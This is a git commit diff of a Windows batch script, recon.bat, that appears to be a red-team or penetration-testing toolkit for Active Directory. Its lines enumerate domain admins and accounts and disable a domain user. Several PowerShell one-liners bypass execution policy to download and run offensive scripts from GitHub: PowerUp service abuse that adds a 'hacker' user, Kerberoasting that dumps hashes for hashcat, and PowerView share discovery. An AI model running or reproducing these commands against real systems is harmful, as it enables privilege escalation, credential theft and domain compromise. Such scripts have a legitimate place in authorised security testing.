c8c78245fc8cc98860bb9368107b907c9bb3646d
yuimamur <59761194+yuimamur@users.noreply.github.com>
2023-04-13 10:37:21 +0900

    Update recon.bat

--- recon.bat
+++ recon.bat
@@ -16,9 +16,7 @@ net group “Domain Admins” /domain
 net user user99 /domain /active:no
 net config workstation
 net accounts
-powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound"
 powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1');Invoke-ServiceAbuse -Name 'AbyssWebServer' -User hacker -Password Password1337"
-"powershell.exe" -nop -c "import-module applocker; get-command *applocker*
 runas /user:DOMAIN\USER /noprofile powershell.exe
 powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat"
 powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt"
